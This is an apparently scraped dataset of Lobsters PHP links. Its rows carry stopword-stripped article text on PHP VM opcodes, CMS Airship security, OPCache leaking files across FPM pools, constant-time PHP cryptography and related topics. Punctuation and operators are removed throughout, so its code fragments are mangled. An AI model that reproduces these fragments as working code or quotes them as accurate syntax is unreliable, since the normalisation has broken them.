exception fastcall temporary instead storing return address throw finally backedup exception fastcall temporary chain previous exception thrown one continue bubbling exception next trycatchfinally otherwise continue bubbling exception next trycatchfinally example go first three step first try throw triggering jump catch catch also throw triggering jump finally block exception backed fastcall temporary finally block also throw finally exception bubble catch exception set previous exception small variation previous example following code try try throw new exception try finally catch exception e try throw new exception catch finally finally try throw new exception finally finally inner finally block entered exceptionally left normally via fastret case previously described exception handling procedure resumed starting parent trycatchfinally block parent trycatch stored fastret opcode trycatch essentially cover interaction finally exception return finally try throw new exception try finally return relevant portion opcode sequence fastcall jmp discardexception return fastret additional discardexception opcode responsible discarding exception thrown try block remember return finally win return try try return finally excepted return value return value determined return line modification matter code result assign qmassign fastcall return fastcall unreachable jmp unreachable preinc fastret return null two opcodes unreachable occur directly return removed optimization showing unoptimized opcodes two interesting thing firstly copied using qmassign basically copy temporary instruction prevents later modification affecting return value secondly also passed fastcall back value return try block later discarded eg finally throw return mechanism used free unused return value individual mechanism simple care need taken composed consider following example dtor traversable class throwing destructor try foreach new dtor v try return finally return finally echo finally code generates following opcodes new args dtor dofcall feresetr fefetchr v fastcall inner try fefree free return fastcall return fastcall unreachable jmp discardexception inner finally fefree free return fastcall return fastret trycatch jmp fefree fastcall jmp echo finally outer finally fastret sequence first return inner try fastcall fefree fastcall return first call inner finally block free foreach loop variable call outer finally block return sequence second return inner finally discardexception fefree fastcall first discard exception return value inner try block free foreach loop variable finally call outer finally block note case order instruction reverse order relevant block source code generator generator function may paused resumed consequently require special vm stack management simple generator function gen x foo yield x yield following opcodes x recv generatorcreate initfcallbyname args string foo yield x sendvarnorefex dofcallbyname generatorreturn null generatorcreate reached executed normal function normal vm stack generatorcreate creates generator object well heapallocated executedata structure including slot variable argument usual executedata vm stack copied generator resumed executor use heapallocated executedata continue use main vm stack push call frame obvious problem possible interrupt generator call progress previous example show yield executed point call frame call foo already pushed onto vm stack relatively uncommon case handled copying active call frame generator structure control yielded restoring generator resumed design used since php previously generator vm page would swapped executor generator restored avoids need copying call frame increase memory usage smart branch common comparison instruction directly followed condition jump example isequal b jmpz echo equal pattern common comparison opcodes isequal implement smart branch mechanism check next instruction jmpz jmpnz instruction perform respective jump operation smart branch mechanism check whether next instruction jmpzjmpnz actually check whether operand actually result comparison something else requires special care case comparison subsequent jump unrelated example code b e f generates isequal b nop jmpz qmassign e jmp qmassign f add free note nop inserted isequal jmpz nop present branch would end using isequal result rather jmpz operand runtime cache opcode array shared without lock multiple process strictly immutable however runtime value may cached separate runtime cache basically array pointer literal may associated runtime cache entry one stored slot runtime cache entry come two type first ordinary cache entry one used initfcall initfcall looked called function based name function pointer cached associated runtime cache slot second type polymorphic cache entry two consecutive cache slot first store class entry second actual datum used operation like fetchobjr offset property property table certain class cached next access happens class quite likely cached value used otherwise expensive lookup operation performed result cached new class entry vm interrupt prior php execution timeouts used handled longjump shutdown sequence directly signal handler may imagine caused manner unpleasantness since php timeouts instead delayed control return virtual machine return within certain grace period process aborted since php pcntl signal handler use mechanism execution timeouts signal pending vm interrupt flag set flag checked virtual machine certain point check performed every instruction rather jump call interrupt handled immediately return vm rather end current section linear control flow specialization take look vm definition file find opcode handler defined follows zendvmhandler zendadd consttmpvarcv consttmpvarcv opcode number zendadd name two argument specify operand type instruction accepts generated virtual machine code generated zendvmgenphp contain specialized handler possible operand type combination name like zendaddspecconstconsthandler specialized handler generated replacing certain macro handler body obvious one operation also specialized handler add specified accepts consttmpvarcv operand tmpvar mean opcode accepts tmps var asks specialized separately remember purpose difference tmp var latter contain reference opcode like add reference slowpath anyway separate specialization worthwhile opcodes make distinction use tmpvar operand list next operandtype based specialization handler also specialized factor whether return value used assigndim specializes based operand type following opdata opcode zendvmhandler zendassigndim varcv consttmpvarunusednextcv spec opdataconsttmpvarcv based signature different variant assigndim generated specification second operand also contains entry next related specialization instead specifies meaning unused operand context mean append operation arr another example zendvmhandler zendassignadd varunusedthiscv consttmpvarunusednextcv dimobj spec dimobj first operand unused implies access general convention object related opcodes example fetchobjr unused prop corresponds prop unused second operand implies append operation third argument specifies meaning extendedvalue operand contains flag distinguishes b b finally spec dimobj instructs specialized handler generated case number total handler generated nontrivial vm generator know certain combination impossible example unused relevant obj case etc finally virtual machine generator support additional sophisticated specialization mechanism towards end definition file find number handler form zendvmtypespechandler zendadd resinfo maybelong maybelong maybelong zendaddlongnooverflow consttmpvarcv consttmpvarcv spec noconstconst commutative handler specialize based vm operand type also based possible type operand might take runtime mechanism possible operand type determined part opcache optimization infrastructure quite outside scope article however assuming information available clear handler addition form int int int additionally spec annotation tell specializer variant two const operand generated operation commutative already consttmpvarcv specialization need generate tmpvarcvconst well fastpath slowpath split many opcode handler implemented using fastpath slowpath split first common case handled falling back generic implementation time looked actual code paste entirety sl shiftleft implementation zendvmhandler zendsl consttmpvarcv consttmpvarcv useopline zendfreeop zval bpvarr bpvarr expected ztypeinfop islong expected ztypeinfop islong expected zendulong zlvalp sizeofzendlong zvallong exvar opline resultvar zlvalp zlvalp zendvmnextopcode saveopline iscv unexpected ztypeinfop isundef bpvarr iscv unexpected ztypeinfop isundef bpvarr shiftleftfunction exvar opline resultvar zendvmnextopcodecheckexception implementation start fetching operand using getopnzvalptrundef bpvarr mode undef part mean check undefined variable performed cv case instead get back undef value asis operand check whether integer shift width range case result directly computed advance next opcode notably type check care whether operand undef use getopnzvalptrundef justified operand happen satisfy fastpath fall back generic implementation start saveopline signal potentially throwing operation follow going case undefined variable handled getopnundefcv case emit undefined variable notice return null value next generic shiftleftfunction called writes result exvar opline resultvar finally input operand freed necessary advance next opcode exception check mean opline reloaded advancing fastpath save two check undefined variable call generic operator function freeing operand well saving reloading opline exception handling performance sensitive opcodes lain similar fashion vm macro seen previous code listing virtual machine implementation make liberal use macro normal c macro others resolved generation virtual machine particular includes number macro fetching freeing instruction operand opntype opdatatype getopnzvalptr bpvar getopnzvalptrderef bpvar getopnzvalptrundef bpvar getopnzvalptrptr bpvar getopnzvalptrptrundef bpvar getopnobjzvalptr bpvar getopnobjzvalptrundef bpvar getopnobjzvalptrderef bpvar getopnobjzvalptrptr bpvar getopnobjzvalptrptrundef bpvar getopdatazvalptr getopdatazvalptrderef freeopn freeopnifvar freeopnvarptr freeunfetchedopn freeopdata freeunfetchedopdata see quite variation bpvar argument specify fetch mode support mode fetch instruction exception funcarg getopnzvalptr basic operand fetch throw notice undefined cv dereference operand getopnzvalptrundef already learned variant check undefined cv getopnzvalptrderef includes deref zval part specialized get operation dereferencing necessary cv var consts tmps macro need distinguish tmps var used tmpvar specialization tmpvar getopnobjzvalptr variant additionally handle case unused operand mentioned convention access use unused operand getopnobjzvalptr macro return reference ex unused ops finally ptrptr variant naming leftover php time actually used doublyindirected zval pointer macro used write operation support cv var type anything else return null differ normal ptr fetch deindirect var operand freeop macro used free fetched operand operate require definition zendfreeop freeopn variable get operation store value free baseline freeopn operation free tmps var free cv consts freeopnifvar exactly say free operand var freeop varptr variant used conjunction ptrptr fetch free var operand indirected freeunfetchedop variant used case operand must freed fetched get typically occurs exception thrown prior operand fetching apart specialized macro also quite macro ordinary sort vm defines three macro control happens opcode handler run zendvmcontinue zendvmenter zendvmleave zendvmreturn continue continue executing opcodes normal enter leave used enterleave nested function call specific operate depends precisely vm compiled eg whether global register used broad term synchronize state globals continuing return used actually exit main vm loop zendvmcontinue expects opline updated beforehand course macro related continue check exception check interrupt zendvmnextopcode yes zendvmnextopcodecheckexception yes yes zendvmsetnextopcode op zendvmsetopcode op yes zendvmsetrelativeopcode op offset yes zendvmjmp op yes yes yes table show whether macro includes implicit zendvmcontinue whether check exception whether check vm interrupt next also saveopline loadopline handleexception mentioned section exception handling saveopline used first potentially throwing operation opcode handler necessary writes back opline used vm might global register execute data loadopline reverse operation nowadays see little use effectively rolled zendvmnextopcodecheckexception zendvmjmp handleexception used return opcode handler already know exception thrown performs combination loadopline continue effectively dispatch handleexception opcode course macro always cover important part
165,Lobsters,php,PHP programming,FullStack Bulletin — a weekly newsletter for the ambitious FullStack developer,https://fullstackbulletin.com/,fullstack bulletin weekly newsletter ambitious fullstack developer,andrea mangano,andrea manganouiweb developer food lover romantic visionary man curious life
166,Lobsters,php,PHP programming,How We Engineered CMS Airship to be Simply Secure,https://paragonie.com/blog/2017/03/how-we-engineered-cms-airship-be-simply-secure,engineered cm airship simply secure,cm airship free software available github democratized publishing never fundamental security best practice absolute basic application security sql injection prevention prevent sql injection prepared statement cornercase attack crosssite scripting prevention defense crosssite scripting x svg contain javascript security header crosssite request forgery mitigation samesite cooky php code twig template automatic update technical detail automatic update mechanism secure automatic update general gear nikita popov instantiates gear designated autopilot access control permission airship permission work hood context action rule context false missing function level access control progressive ratelimiting secure account recovery user opt entirely split token input filtering realworld example configurable web interface security header secure file uploads blog post static page caching cryptography halite cryptography library libsodium halite libsodium cm airship securebydefault content management system,cm airship free software content management system available github introduced world last year chose build cm airship two reason population online publisher need content management system significantly dwarf population web designer software developer existing content management system offered inadequate security neglected cultivate culture promotes better security practice often sacrifice security entirely pursuit adoption market share although tried year continue try improve security posture open source cm platform believe truly democratized publishing possible securebydefault option available today certain cm airship secure rest post dedicated answering question detail one thing want keep mind read blog airship user problem likely never solve work done airship user may want take note contrast solution platform develop fundamental security best practice section address absolute basic application security sql injection prevention cm airship strategy prevent sql injection use prepared statement api encourages usage php data db run select table nt bother errorprone strategy involve escaping input inserting escaped data directly query string nt burden airship developer complicated step prepared statement allow u databaseinteractive code secure sql injection simple easy read understand furthermore disable emulated prepared statement pdo default sidestep cornercase attack crosssite scripting prevention cm airship employ layered defense crosssite scripting x contextaware escaping provided twig enabled default security header unlike cm platform nt perform x escaping input perform rendering page cache result escaping output prevents clever trick like column truncation enabling stored x vulnerability plague system escape input additionally storing unaltered version user data database becomes possible u detect reproduce prevent hypothetical filter bypass vulnerability would become obfuscated escaped data saving rather loading prevent stored x vulnerability uploaded file airship sends header disable mime type sniffing download file whose mime type whitelisted attachment instead loading browser related svg contain javascript browser execute view svg file directly standard often terrible security cm airship also sends contentsecuritypolicy header see security header section crosssite request forgery mitigation cm airship store strict samesite cooky user browser particular session cookie browser support samesite cooky would enough mitigate csrf exploit browser currently support samesite cooky cm airship also employ challengeresponse authentication mechanism resistant timing attack replay attack additionally csrf mitigation token bound particular request uri interface managing token straightforward php code postdata post postdata csrf occurred twig template form method post action someuri formtoken someuri etc form automatic update explained technical detail automatic update mechanism covered secure automatic update general cm airship open source cm php ecosystem offer cryptographically secure automatic update gear airship gear feature allows change behavior core without change obliterated automatic update allows greater degree freedom develop powerful extension cm airship example wanted replace behavior autopilot router use nikita popov fastroute instead could something like php declare namespace myvendormynamespace gear extract autopilot autopilotshim namespace class fastrouteautopilot extends autopilotshim actually serve http request public function route hook nikicfastroute instead example gear attach autopilot fastrouteautopilot namespace engine instead creating new autopilot class runtime instantiates gear designated autopilot nt use simple inheritance may want use two different extension upgrade two different piece functionality class class simply extend base autopilot class would nt possible use extension sum gear api allows change behavior core airship class within custom application extension persist custom core behavior change wake automatic update install multiple extension affect class access control permission access control allow designate capability user lot different way solve problem designed solution goal mind must simple meaningful interface must securebydefault must flexible grant role specific user grant role specific group user group inherit permission parent group must databasedriven code change configurable web ui api look like airship developer update update step twig template look like update update form go endif airship permission work hood airship us whitelist access control system based three concept context application action trying rule usersgroups allowed perform action context particular permission request match many context especially overlapping pattern happens every context validated permission request granted succeed context matching particular request request refused unless user admin application set possible action eg create read update delete rule grant particular user group ability perform particular action within particular context rule used allow access deny access whitelist mean group inheritance baked set rule allow group perform action within given context group descendant also allowed accessing particular context matching context unless administrator return false default decision made prevent missing function level access control vulnerability attacker managed find valid request uri application nt match context database progressive ratelimiting user attempt login incorrect passphrase reset password tally maintained airship bad attempt registered longer take airship respond subsequent request configurable maximum timeout default timeout start double failure failure tally based provided username even user nt exist ip subnet default address treated distinct subnet address subnet treated user default maximum timeout second timeout either enforced clientside server block request say try later serverside sleep clientside enforcement carry cornercase risk locking legitimate user serverside enforcement carry cornercase risk server resource exhaustion opening lot longrunning process goal feature stop bruteforce attack denialofservice attack default clientside enforcement configure clicking checkbox admininstrative control panel secure account recovery put bluntly account recovery aka forgot password mechanism backdoor hacker break email account usually gain immediate access thirdparty website allow password reset website enforce logins account recovery implementation secure industry user opt entirely alternatively user supply gnupg public key email encrypted public key order attack setup would need compromise user email account obtain user gnupg private key furthermore use split token attempt exploit timing sidechannel database lookup find valid password reset token end failure input filtering traditional php application http post data accessed via post multidimensional array example valid http post query foobar bazqux foobar baz qux foobar baz qux baz quux foobar baz qux query result vastly different post structure array foo string bar baz string qux array foo string bar baz array string qux array foo string bar baz array string qux string quux array foo string bar baz array qux string problematic expecting post baz string given array either throw typeerror raise enotice cast input useless string array prevent use input filter system implemented alongside csrf mitigation csrf attack occurs user sends invalid input application treat request post data present post new editpostfilter csrf attack input valid input filter system contains two component input filter container individual filter rule input filter system best illustrated realworld example addfilter author new intfilter addfilter blogpostbody new stringfilter addfilter category new intfilter addfilter description new stringfilter addfilter format new whitelist html markdown rich text rst setdefault rich text addfilter published new stringfilter addfilter metadata new stringarrayfilter addfilter title new stringfilter addcallback stringfilter class nonempty addfilter redirectslug new boolfilter addfilter savebtn new stringfilter addfilter slug new stringfilter filter named type enforce stringfilter ensures input string stringarrayfilter ensures input onedimensional array string callback supported stringfilter nonempty ensures string nonempty value whitelist filter exactly say label one given value must selected else revert default value like switchcase nt retype remain cognizant break statement default cm airship sends following http header every request xcontenttypeoptions nosniff xframeoptions sameorigin xxssprotection modeblock behind http cm airship also send stricttransportsecurty header instructing browser never connect domain insecure http additionally cm airship sends contentsecuritypolicy header configurable web interface decide want protect airship rogue certificate authority also configure publickeypins header learn security header secure file uploads follow step outlined blog post particular file stored outside web root file read never executed file type known contain executable code could used facilitate phishing eg html file instead served text file mime type textplain additionally file real mime type nt included lean whitelist accessing force downloaded attachment rather opened user web browser help protect stored x attack static page caching cm airship includes static page caching firstclass feature use simply invoke stasis instead view within controller static page caching defense slashdot effect help mitigate impact layer ddos attack typical response time airship page load modest hardware m static page caching m cryptography cm airship us halite cryptography library whose underlying cryptography powered libsodium familiar tool explanation necessary otherwise learn halite libsodium cm airship securebydefault content management system hope reading post give everyone greater appreciation security engineering work went free software cm lot care went ensuring airship would secure would easy make thirdparty extension developed airship secure need team carefully construct secure application business get touch consult
167,Lobsters,php,PHP programming,"“Hello, (real) world!” in PHP in 2017",https://kukuruku.co/post/hello-real-world-in-php-in-2017/,hello real world php,database phpframework pdopgsql http spa javascript many friend webpack typescript bootstrap sas nodejs npm greeting pomodoro doctrine rest summary,might think easy write php look something like php echo hello world well else could one expect language gentle learning curve exactly used long time ago one way see try build realistic helloworld application step step must say quite step first need realize one make application without framework nowadays simply write echo hello world code doomed bad forever fix therefore take modern popular framework eg symfony better create database installing framework database well guess hardcode string directly source code database use postgresql case still know install help sudo aptget install postgresql installation ubuntu create postgres user run psql command full permission database sudo u postgres psql create database user password think complicated one create role helloworlduser password login database create database helloworld owner helloworlduser also make sure pghbaconf allowed connect database localhost something like host check connection psql h localhost u helloworlduser helloworld entering password get terminalbased frontend postgresql create table create table greeting id int greeting text primary key id insert greeting id greeting value hello world great database get framework phpframework hope everyone composer installed proceed installation framework composer createproject symfonyframeworkstandardedition helloworldphp installation ask connection parameter database host databasename helloworld databaseuser helloworlduser databasepassword rest defaultoptional change driver driver pdopgsql configyml config hopefully pdopgsql php extension installed computer make sure everything work le running cd helloworldphp binconsole server start symfony run server listens port plus debug code something like symfony go http browser whew seems like got controller improve view create model close sorry spa single page application nowadays php developer work without knowing javascript full stack engineer mean helloworld must follow rule well okay okay also pure php backend engineer consider common case javascript many friend therefore find view symfony default view appresourcesviewdefaultindexhtmltwig replace everything doctype html html lang en head meta charset meta httpequiv xuacompatible content ieedge meta name viewport content widthdevicewidth head body div id root div script src jsbundlejs script body html ie everything bundlejs compressed javascript file together style everything need create bundle must write application configure webpack build application need webpack write pure javascript typescript obviously trend also need somehow convert typescript pure j easily done help webpack similar library go without saying one writes pure typescript either need framework one trendiest binding today react redux styling going use good old bootstrap via sas course going need lot j library hope nodejs npm make sure latest npm run npm init dependency use write something like packagejson dependency typesreact typesreactdom babelcore babelloader babelpresetreact bootstrapsass cssloader nodesass react reactdom reactredux redux resolveurlloader sassloader styleloader tsloader typescript urlloader webpack typesnode run npm install also run npm install webpack webpack command available globally ala much come since typescript also necessary create tsconfigjson file something like compileroptions module moduleresolution node sourcemap false target esnext outdir webts lib dom scripthost jsx react include frontend t frontend tsx configs okay get typescript application first create component display text file frontendcomponentsgreetingstsx import react react export interface greetingsprops text string isready boolean onmount class greeting extends reactcomponent greetingsprops undefined componentdidmount thispropsonmount render return thispropstext export default greeting spa fetch text via rest api react viewcomponents layer also need application logic something manage state going use redux well package connect redux react reactredux also create component create greeting component necessary property able let store state know new action happened data display received disclaimer started learn redux judge please component look say like file frontendcomponentsapptsx import react react import connect reactredux import greeting greeting const mapstatetoprops state return state const mapdispatchtoprops dispatch return onmount fetch response return responsejson json dispatch type fetchgreeting text jsongreeting export default connect mapstatetoprops mapdispatchtoprops greeting well also application entry point creation redux store dispatcher made quite simple guess okay helloworld load style bootstrap import bootstrapsassassetsstylesheetsbootstrapscss import react react import reactdom reactdom import provider reactredux import app componentsapp import createstore redux const app state isready false text action switch actiontype case fetchgreeting return objectassign state isready true text actiontext return state const store createstore app reactdomrender provider store store app provider documentgetelementbyid root happening initial state system isready false text reducer named app created process fetchgreeting action return new state system store created process state everything rendered element added ro view div id root div oh yeah forgot webpack config const webpack require webpack const path require path const environment processenvnodeenv development let config context pathresolve dirname frontend entry indextsx output filename bundlejs path pathresolve dirname webjs resolve extension j jsx t tsx module rule test tsx use loader babelloader query presets react loader tsloader test woff ttf eot svg loader urlloader test sc use loader styleloader loader cssloader loader resolveurlloader loader sassloader plugins new webpackdefineplugin processenvnodeenv jsonstringify environment node process false environment production configpluginspush new webpackoptimizeuglifyjsplugin compress dropconsole false warning false moduleexports config run webpack nodeenvproduction webpack get minimized version bundlejs pomodoro know sick tired writing work efficiently implies necessary take break pomodoro technique etc exactly going time let go already know load code frontend phpside ready doctrine lot time already spent created backend entity yet fix php srcappbundleentitygreetingphp namespace appbundleentity use doctrineormmapping orm ormentity ormtable name greeting class greeting ormcolumn type integer ormid private id ormcolumn type string private greeting public function getid return id public function getgreeting return greeting super bit rest need make simple rest api least spit json query get add new method controller srcappbundlecontrollerdefaultcontrollerphp route greeting id public function greeting id greeting getdoctrine getrepository appbundle greeting find id return new jsonresponse greeting greeting getgreeting run world displayed screen look almost like result php echo â hello worldâ except bootstrap font modern application according canon well almost according canon except test error checking much really sick tired summary dispute like need php java become frequent nowadays know right holly war tricky dispute argument favor php easy beginner mind argument valid anymore exactly trying say article novice programmer learn lot new thing well write ton configs framework similar java framework database linux shminux javascript baggage httpprotocol various tooling many even spa even article become popular going change mind something like spa come life know deal least general term build decent modern application without framework find complete world source code
168,Lobsters,php,PHP programming,Log all queries in a Laravel CLI command,https://ma.ttias.be/log-queries-laravel-cli-command/,log query laravel cli command,laraveldebugbar package artisan dns spy db facade,webbased laravel project use excellent laraveldebugbar package inbrowser overview query executed per page command run via artisan command line need alternative method used quite often working dns spy since application logic inside worker job executed via cli quick method logging sql query console output instead php use illuminatesupportfacadesdb public function handle db listen function sql vardump sql sql first import db facade next add new listener every query executed let vardump query alternatively use dump dd result php artisan queue work string select xxx xxx recordid xxx recordid null string insert xxx value nameserverid ttl value adding db listener convenient way seeing query right console time debugbar used
169,Lobsters,php,PHP programming,Mitigating PHP's long standing issue with OPCache leaking sensitive data,https://ma.ttias.be/mitigating-phps-long-standing-issue-opcache-leaking-sensitive-data/,mitigating php long standing issue opcache leaking sensitive data,vulnerability php validate userid fetch script memory stored bytecode advocated running multiple master instead multiple pool year solution upgrade php set additional configuration bug opcachevalidatepermission opcachevalidateroot original bugreport default value however insecure explicitly enable prevent behaviour minimum version php posted osssecurity mailing list run multiple php master single master per pool indirect local privilege escalation root hard opcachegetstatus goal steal data server normally requires root privilege got additional source,old security vulnerability fixed php regarding way handle opcaches environment single master process share multiple phpfpm pool common way run php nowadays might affect vulnerability php method speed dynamic nature interpreter called bytecode caching php get interpreted every pageload meaning php get translated bytecode server understands execute since php page change every second php cache bytecode memory serve response instead compile interpret php script every time default phpfpm setup process tree look like phpfpm master process etcphpfpmconf phpfpm pool uid phpfpm pool uid phpfpm pool uid single phpfpm master process get started root user spawn additional fpm pool run user serve website php opcache bytecode cache held master process problem php validate userid fetch script memory stored bytecode concept shared memory php mean everything stored memory segment including file check version already exists bytecode version script exists bytecode served without additional check version script exist bytecode fpm pool running unprivileged uid try read disk linux prevent read file process access know like supposed happen one primary reason advocated running multiple master instead multiple pool year solution upgrade php set additional configuration way long period bug resolved fix additional master configuration cat etcphpfpmconf opcachevalidatepermission default lead opcache check file readability access cached file directive enabled shared hosting environment user phpfpm pool reuse common opcache shared memory opcachevalidateroot default directive prevents file name collision different chroot environment enabled site may serve request different chroot environment introduction opcachevalidatepermission opcachevalidateroot mean force php opcache also check permission file force validation root path file avoid chrooted environment reading eachothers file original bugreport default value however insecure understand like keep compatibility previous version avoid breaking change minor version explicitly enable prevent behaviour minimum version php fix get much attention noticed someone posted osssecurity mailing list mitigate properly need least anything lower already end life get fix even though opcache got introduced php need recent newer mitigate still run php many want safe best bet either run multiple php master single master per pool disable opcache entirely indirect local privilege escalation root long standing issue php actually serious look first glance manage compromise single website cm php get updated hard shared memory allows access website page cached opcache effectively use shared memory buffer passage way read website php file read configs get access database steal data usually need root access server php opcache give convenient shortcut accomplish similar thing need path file either retrieved via opcachegetstatus enabled default guess path shared hosting environment usually hard either actually make shared memory architecture almost bad local privilege escalation vulnerability depending want accomplish goal steal data server normally requires root privilege got goal actually get root run rootonly script aka bind lower port etc possible good part fix new php configuration bad news need update latest release get explicitly enable additional source reading pleasure
170,Lobsters,php,PHP programming,phpstan: PHP Static Analysis Tool - discover bugs in your code without running it!,https://github.com/phpstan/phpstan,phpstan php static analysis tool discover bug code without running,,
171,Lobsters,php,PHP programming,PHP 7.2 Adds Modern Cryptography to its Standard Library,https://dev.to/paragonie/php-72-the-first-programming-language-to-add-modern-cryptography-to-its-standard-library,php add modern cryptography standard library,log continue,log continue place coder share stay uptodate grow career
172,Lobsters,php,PHP programming,Cryptographically Secure PHP Development,https://paragonie.com/blog/2017/02/cryptographically-secure-php-development,cryptographically secure php development,sodiumcompat purephp implementation libsodium audited yet rule programming cryptography code c zeroth rule php cryptography nt write php libsodium easy win php cryptography code design api prevent failing open compare string constanttime supported version php use strong randomness randomcompat million installs packagist use php cryptography hard part ensure string offset byte character function overloading safely convert integer character without table lookup let look code using table lookup indexed secret data cachetiming sidechannel nt use sort table lookup using constanttime encoding routine covered constanttime rfc encoding library ensure multiplication constanttime research constanttime multiplication kudelski security information pooled bearssl project constanttime implementation integer multiplication pure php impossible ambitious,working sodiumcompat purephp implementation libsodium come attention lot engineering decision made minimize risk sidechannels nt wellknown outside development team interest transparency well promoting better understanding among php developer community like take opportunity document method important sodiumcompat audited yet considered exhaustive may additional step necessary producing secure cryptography code php page considered supplementary existing rule programming cryptography code c zeroth rule php cryptography avoid writing cryptography code php nt write php use reputable php extension libsodium instead example sodiumcompat implement rule php cryptography offloading libsodium via core php pecl otherwise available easy win php cryptography code design api prevent failing open three way handle unexpected condition middle library fatal error application terminates unavoidably nonfatal error fail silently probably resulting catastrophic security failure throw exception error class probably want throwing exception allows simultaneously default failing closed like fatal error also allowing cognizant developer choose handle exception way like nonfatal error lazy implementation secure default still empowers developer perspective avoid unexpected crash return false null expect user check return value compare string constanttime using supported version php mean need use hashequals otherwise need polyfill wordpress developer happen wondering yes provide polyfill developer object implementation hashequals worry leaking length string compared total nonissue would nt worth remarking nt common length output secret security application depends obfuscating obvious information protocol probably insecure lot way use strong randomness using php use randombytes randomint using php import randomcompat project use randombytes randomint php try data randombytes catch error ex made mistake catch exception ex access o csprng handle however deem appropriate may tempting cry foul since wrote randomcompat recommending blog post however randomcompat one widely used php library million installs packagist writing count wordpress website used virtually every serious php framework symfony laravel zend still support php hardpressed find security expert familiar php nt recommend use php function cryptography security purpose rand mtrand uniqid lcgvalue gmprandom messy hack like hash algo stuff microtime stuff php cryptography hard part far everything covered generally universalizable need sane api strong randomness constanttime string comparison secure cryptography every programming language thing get bit tricky phpspecific ensure string offset byte character php littleknown feature called function overloading change behavior function notable substr strlen operate character rather byte consider following example php param string knownstring param string userstring return bool function unsafehashequals knownstring userstring klen strlen knownstring ulen strlen userstring klen ulen return false result klen result ord knownstring ord userstring identical string result exactly return result char byte hasha hashb vardump unsafehashequals hasha hashb run code mbstringfuncoverload set return false expect clearly two string value however set mbstringfuncoverload suddenly return true guarantee php treating string raw binary string byte character use multibyte function mbstrlen mbsubstr instead taking care specify charset klen strlen knownstring ulen strlen userstring klen mbstrlen knownstring ulen mbstrlen userstring totally clear little writing software may run machine nt mbstring extension installed fortunately mbstringfuncoverload option anything mbstring installed sure original function behave expected safely convert integer character without table lookup regardless cryptography primitive working one operation certainly implementing converting integer string sound like trivial undertaking chr ord provided language exact purpose however aware way chr implemented make unsuitable cryptography purpose first let look code cg onecharstring c zvalinternedstr returnvalue cg onecharstring c help know onecharstring populated map integer ascii equivalent matter data encoding decoding secret either plaintext secret key using chr mean using table lookup indexed secret data creates textbook example cachetiming sidechannel sidestep use pack c int safely convert integer ascii character since pack nt use sort table lookup using constanttime encoding routine covered introducing constanttime rfc encoding library way php currently implement etc likely prone cachetiming information leak since using possibly secret data index table lookup could walk solution painstaking detail use library already wrote worry detail ensure multiplication constanttime yes read right based research constanttime multiplication kudelski security information pooled bearssl project certainly platform multiplying two integer may take longer depending value two integer case integer multiplication leak timing information include one number one number power number certain value arm unfortunately developer whether multiplication vulnerable depends entirely hardware ie processor platform nt leak anything platform leak enough information steal cryptographic secret see kudelski security post mentioned previously attack compiled msvc work around wrote constanttime implementation integer multiplication pure php sodiumcompat content reproduced inline annotation beginning multiply two integer constanttime param int param int b return int public static function mul b important detail know platform secure opt implementation favor multiplying integer old fashioned way setting static variable true runtime default false advise one set true unless irrefutable proof safe operating environment paragoniesodiumcompat fastmult return int b optimization cache value first run static size null size platform platform size phpintsize c equivalent mask b binary bit binary bit mask b size stripping negative sign safely use bitshift operation eventually get b b mask mask b actual multiplication loop always run size time consists addition bitwise operator size equivalent b c c int b double halve b b equivalent mask c reintroduces negative sign b negative value c c mask mask c return int c thus eliminate timing sidechannels introduced integer multiplication php code impossible cryptography best practice simply possible wit php nt allow perform direct memory management zeroing memory buffer possible furthermore vulnerability introduced somewhere else php interpreter example via opcache little anything mitigate php script ambitious thinking writing cryptography code php inherited legacy application someone decided inventive strategy handling sensitive data interested seeing existing php cryptography library want use secure consult develop pentest also audit cryptography code
174,Lobsters,php,PHP programming,How Tech Companies Are Shaped By Programming Languages,https://www.technologyreview.com/s/536356/toolkits-for-the-mind/,tech company shaped programming language,said interview power percent domain thefacebook secret weapon developed french research institute growing guido van rossum geniuscom,successful programming language overall philosophy set guiding principle organize vocabulary set possible instruction make available logical whole php creator rasmus lerdorf freely admits cobbled together know stop said interview absolutely idea write programming kept adding next logical step along way programmer favorite example php function called mysqlescapestring rids query malicious input sending database example malicious input think form website asks email address hacker enter code slot force site cough password bug discovered function new version added called mysqlrealescapestring original replaced result bit like two similarlooking button right next airline cockpit one put landing gear one put safely affront common recipe disasteryet despite widespread contempt php much web built back php power percent domain one estimate facebook wikipedia leading publishing platform wordpress php project php flaw perfect getting started name originally stood personal home page made easy add dynamic content like date user name static html page php allowed leap tinkering website writing web application small imperceptible need prophp getgoingness crucial success wikipedia say ori livneh principal software engineer wikimedia foundation operates project always loathed php tell project suffers largescale design flaw result reliance language partly foundation make wikipedia page available version adapted mobile device site get userfriendly editing interface php allowed people engineer contribute new feature wikipedia entry came display hieroglyphic egyptology page instance handle sheet music programming language php sustains facebook movefast hackeroriented corporate culture built google php google become google needed exactly one thing needed search spare fast meticulously well engineered made refined powerful language java c facebook contrast bazaar small experiment smorgasbord button feed gizmo trying capture attention php made cooking feature quicklyyou almost imagine zuckerberg harvard dorm room fateful day facebook born least could get site online web move fast user fickle way ever able capture moment first matter made big ball mud plate spaghetti horrible hose cabinet borrow programmer rich lexicon describing messy code got thing done people could use thinking beautiful code thinking friend logging thefacebook look picture girl knewtoday facebook worth billion sign wall office done better perfect move fast break thing bold message supposed keep employee tune company hacker culture precisely php value moving fast breaking thing fact much essence php anyone speaks language indelibly think way might say language created sustains facebook culturethe secret weaponif wanted find exact opposite php kind natural experiment show extreme looked like much better selfserious lower manhattan headquarters financial trading firm jane street capital company claim responsible roughly percent daily equity trading volume united stateswhen meet yaron minsky jane street head technology sitting desk working enigma machine beside one dozen world war ii code device left world would think clear winner contest coolest secret weapon room way keep talking obscure programming language called ocaml minsky computer science phd convinced employer year ago rewrite company entire trading system ocaml almost nobody used language actual work developed french research institute academic trying improve computer system automatically prof mathematical theorem minsky thought ocaml gotten know grad school could replace complex excel spreadsheet powered jane street trading systemsocaml big selling point type system something like microsoft word grammar checker except instead putting squiggly green line underneath code think wrong let run program written type system tend far reliable written without program might trade billion big dayminsky say catching bug ocaml type system allows jane street coder focus loftier problem one wonder internalized system constant nagging time ocaml become kind newspeak make impossible think bad thoughtsthe catch get full benefit type checker programmer add complex annotation code word grammar checker required diagram sentence writing code type constraint nuisance even demoralizing make worse ocaml programming language traffic kind deep abstract math far beyond coder language rigor like catnip people though giving jane street unusual advantage tight hiring market programmer software developer mostly join facebook wikipedia spite php minsky say book real world lure steady supply highquality candidate attraction language kind people use jane street company play fourperson chess break room culture competitive intelligence use fancy programming language seem go hand handgoogle appears trying pull similar trick go highperformance programming 